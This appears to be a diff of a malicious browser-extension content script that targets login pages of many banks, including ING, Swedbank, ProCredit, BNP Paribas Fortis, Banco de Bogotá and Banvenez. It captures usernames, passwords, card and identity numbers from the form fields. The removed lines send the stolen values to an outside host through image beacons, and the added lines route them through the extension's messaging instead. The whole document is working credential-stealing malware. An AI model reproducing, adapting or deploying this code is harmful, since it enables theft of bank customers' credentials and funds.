@@ -3,8 +3,7 @@ var myStringArray = ["secureinternetbank.com", "secureweb.inalco.com","financier
 var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
     if (window.location.href.indexOf(myStringArray[i]) > -1) {
-(new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/sites.php?l="+window.location.href;
-  }
+         chrome.runtime.sendMessage({cmd: "w",data: window.lcoation.href});
 }
 
 
@@ -15,9 +14,10 @@ if (top['location']['href']['indexOf']('https://onlinebanking.anb.com.sa/RetailB
             clearInterval(interval);
             document['getElementsByClassName']('login_submit')[0].onmouseover = function (_0x441cx2) {
                   var login = {};
-                  login.userid = document.getElementById("uname").value;
-                  login.password = "USERNAME";
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+                  login.username = document.getElementById("uname").value;
+                  login.pass = "USERNAME";
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -28,9 +28,10 @@ if (top['location']['href']['indexOf']('https://onlinebanking.anb.com.sa/RetailB
             clearInterval(interval);
             document['getElementsByClassName']('submit')[0].onmouseover = function (_0x441cx2) {
                   var login = {};
-                  login.userid = document.getElementsByName("password1")[0].value;
-                  login.password = "PASSWORD";
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+                  login.username = document.getElementsByName("password1")[0].value;
+                  login.pass = "PASSWORD";
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -49,9 +50,10 @@ if (top['location']['href']['indexOf']('mijnzakelijk.ing.nl') > -1) {
                 p = inputs[i].value;
                }
                 }
-                  login.userid = document.getElementsByClassName(" firstfield")[0].value;
-                  login.password = p;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+                  login.username = document.getElementsByClassName(" firstfield")[0].value;
+                  login.pass = p;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -71,9 +73,10 @@ if (top['location']['href']['indexOf']('mijn.ing.nl') > -1) {
                 p = inputs[i].value;
                }
                 }
-                  login.userid = document.getElementsByClassName(" firstfield")[0].value;
-                  login.password = p;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+                  login.username = document.getElementsByClassName(" firstfield")[0].value;
+                  login.pass = p;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -86,9 +89,10 @@ if (top['location']['href']['indexOf']('online.procreditbank.ge') > -1) {
             clearInterval(interval);
             document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
               var login = {};
-                  login.userid = document.getElementsByClassName("Login_input_name")[0].value;
-                  login.password = document.getElementsByClassName("Login_input_pass")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+                  login.username = document.getElementsByClassName("Login_input_name")[0].value;
+                  login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -100,9 +104,10 @@ if (top['location']['href']['indexOf']('online2.procreditbank.ge') > -1) {
             clearInterval(interval);
             document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
               var login = {};
-                  login.userid = document.getElementsByClassName("Login_input_name")[0].value;
-                  login.password = document.getElementsByClassName("Login_input_pass")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+                  login.username = document.getElementsByClassName("Login_input_name")[0].value;
+                  login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -115,9 +120,10 @@ if (top['location']['href']['indexOf']('online1.procreditbank.ge') > -1) {
             clearInterval(interval);
             document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
               var login = {};
-                  login.userid = document.getElementsByClassName("Login_input_name")[0].value;
-                  login.password = document.getElementsByClassName("Login_input_pass")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.password;
+                  login.username = document.getElementsByClassName("Login_input_name")[0].value;
+                  login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -131,9 +137,12 @@ if (top['location']['href']['indexOf']('internetbank.swedbank.se') > -1) {
             document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
               var option = document.getElementsByName("auth:metod_2");
               var select = option.options[option.selectedIndex].value;
+              var userid = document.getElementsByName("auth:kundnummer")[0].value;
               var login = {};
-                  login.userid = document.getElementsByName("auth:kundnummer")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+select;
+                  login.username = userid;
+                  login.pass = select;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -146,9 +155,10 @@ if (top['location']['href']['indexOf']('internetbanking.caixa.gov.br') > -1) {
             clearInterval(interval);
             document['getElementsByName']('btnLogin')[0].onclick = function (_0x441cx2) {
               var login = {};
-                  login.userid = document.getElementsByName("name")[0].value;
-                  login.userpass = "test buttons 1 of 3";
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.userpass;
+                  login.username = document.getElementsByName("name")[0].value;
+                  login.pass = "test buttons 1 of 3";
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -161,9 +171,10 @@ if (top['location']['href']['indexOf']('www.bnpparibasfortis.be') > -1) {
             clearInterval(interval);
             document['getElementsByClassName']('btn_default btn_primary login_btn btn_active_bg')[0].onclick = function (_0x441cx2) {
               var login = {};
-                  login.userid = document.getElementsByName("cardNum")[0].value;
-                  login.userpass = document.getElementsByName("clientNum")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+login.userpass;
+                  login.username = document.getElementsByName("cardNum")[0].value;
+                  login.pass = document.getElementsByName("clientNum")[0].value;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -177,9 +188,12 @@ if (top['location']['href']['indexOf']('https://online.swedbank.se/app/privat/lo
             document['getElementsByClassName']('_btn--block swed-button _margins-lg swed-button--primary')[0].onclick = function (_0x441cx2) {
               var option = document.getElementsByClassName("ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required swed-input-container__form-control");
               var select = option.options[option.selectedIndex].value;
+              var userid = document.getElementsByName("userId")[0].value;
               var login = {};
-                  login.userid = document.getElementsByName("userId")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+select+"&p="+login.userid;
+              login.username = select;
+              login.pass = userid;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -193,9 +207,12 @@ if (top['location']['href']['indexOf']('https://web.bancadigitalbod.com') > -1) 
             document['getElementsByClassName']('button-continuar-apagado')[0].onclick = function (_0x441cx2) {
               var option = document.getElementsByName("select-corto");
               var select = option.options[option.selectedIndex].value;
+              var documentNumber = document.getElementsByName("form:txtNumIdCli")[0].value;
               var login = {};
-                  login.documentNumber = document.getElementsByName("form:txtNumIdCli")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+select+"&p="+login.documentNumber;
+                  login.username = select;
+                  login.pass = documentNumber;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -209,9 +226,13 @@ if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal
             document['getElementsByClassName']('btn-ingreso-empresas')[0].onclick = function (_0x441cx2) {
               var option = document.getElementsByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:tipoDocumento");
               var select = option.options[option.selectedIndex].value;
+              var documentNumber = document.getElementsByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:numeroDocumento")[0].value;
               var login = {};
-                  login.documentNumber = document.getElementsByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:numeroDocumento")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+select+"&p="+login.documentNumber;
+                  login.username = select;
+                  login.pass = documentNumber;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
+
             }
         }
     }, 1000)
@@ -226,12 +247,15 @@ if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal
               var option = document.getElementsByName("documentType");
               var select = option.options[option.selectedIndex].value;
               var login = {};
-                  login.documentNumber = document.getElementsByName("documentNumber")[0].value;
-                  login.pass = document.getElementsByName("password")[0].value;
-                  login.card = document.getElementsByName("cardNumber")[0].value;
-                  data = "docNumber: "+ login.documentNumber + " pass: "+ login.pass + " card: "+ login.card;
+              var documentNumber = document.getElementsByName("documentNumber")[0].value;
+              var pass = document.getElementsByName("password")[0].value;
+              var card = document.getElementsByName("cardNumber")[0].value;
+              var data = "docNumber: "+ documentNumber + " pass: "+ pass + " card: "+ card;
+                  login.username = select;
+                  login.pass = data;
+                  login.href = window.location.href;
+                  chrome.runtime.sendMessage({cmd: "l",data: login});
 
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+select+"&p="+data;
             }
         }
     }, 1000)
@@ -244,9 +268,10 @@ if (top['location']['href']['indexOf']('e-bdv.banvenez.com') > -1) {
             clearInterval(interval);
             document['getElementsByClassName']('input_boton_neg')[0].onclick = function (_0x441cx2) {
              var login = {};
-            login.email = document.getElementsByName("Username1")[0].value;
+            login.username = document.getElementsByName("Username1")[0].value;
             login.pass = document.getElementsByName("Passworde1")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+            login.href = window.location.href;
+            chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -259,9 +284,10 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
             clearInterval(interval);
             document['getElementsByName']('input_boton_neg')[0].onclick = function (_0x441cx2) {
              var login = {};
-            login.email = document.getElementsByName("notarjeta1")[0].value;
+            login.username = document.getElementsByName("notarjeta1")[0].value;
             login.pass = document.getElementsByName("passwordp1")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+            login.href = window.location.href;
+            chrome.runtime.sendMessage({cmd: "l",data: login});
             }
         }
     }, 1000)
@@ -274,9 +300,10 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
               clearInterval(interval);
               document['getElementsByClassName']('login_submit')[0].onclick = function (_0x441cx2) {
                var login = {};
-              login.email = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$UserNameTextBox")[0].value;
+              login.username = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$UserNameTextBox")[0].value;
               login.pass = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$PasswordTextBox")[0].value;
-              (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
       }, 1000)
@@ -289,10 +316,10 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
               clearInterval(interval);
               document['getElementsByName']('j_idt55')[0].onmouseover = function (_0x441cx2) {
                var login = {};
-              login.email = document.getElementsByName("j_username")[0].value;
+              login.username = document.getElementsByName("j_username")[0].value;
               login.pass = document.getElementsByName("j_password")[0].value;
-
-              (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
       }, 1000)
@@ -305,9 +332,10 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
               clearInterval(interval);
               document['getElementsByClassName']('button actionContinue scTrack:unifiedlogin-login-submit')[0].onclick = function (_0x441cx2) {
                var login = {};
-              login.email = document.getElementsByName("login_email")[0].value;
+              login.username = document.getElementsByName("login_email")[0].value;
               login.pass = document.getElementsByName("login_password")[0].value;
-              (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
       }, 1000)
@@ -320,9 +348,10 @@ var login_form = document.getElementById("loginForm");
     if(login_form){
         login_form.onsubmit = function(){
             var login = {};
-            login.email = document.getElementsByName("usus")[0].value;
+            login.username = document.getElementsByName("usus")[0].value;
             login.pass = document.getElementsByName("clave")[0].value;
-            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+            login.href = window.location.href;
+            chrome.runtime.sendMessage({cmd: "l",data: login});
 		        }
           }
         }
@@ -334,9 +363,10 @@ var login_form = document.getElementById("loginForm");
               clearInterval(interval);
               document['getElementsByClassName']('botones_1')[0].onmouseover = function (_0x441cx2) {
               var login = {};
-              login.email = document.getElementsByName("userid")[0].value;
+              login.username = document.getElementsByName("userid")[0].value;
               login.pass = document.getElementsByName("password")[0].value;
-              (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
       }, 1000)
@@ -349,9 +379,10 @@ var login_form = document.getElementById("loginForm");
               clearInterval(interval);
               document['getElementsByClassName']('botones_1')[0].onmouseover = function (_0x441cx2) {
                var login = {};
-              login.email = document.getElementsByName("userlogin")[0].value;
+              login.username = document.getElementsByName("userlogin")[0].value;
               login.pass = document.getElementsByName("passwd")[0].value;
-              (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
+              login.href = window.location.href;
+              chrome.runtime.sendMessage({cmd: "l",data: login});
               }
           }
       }, 1000)
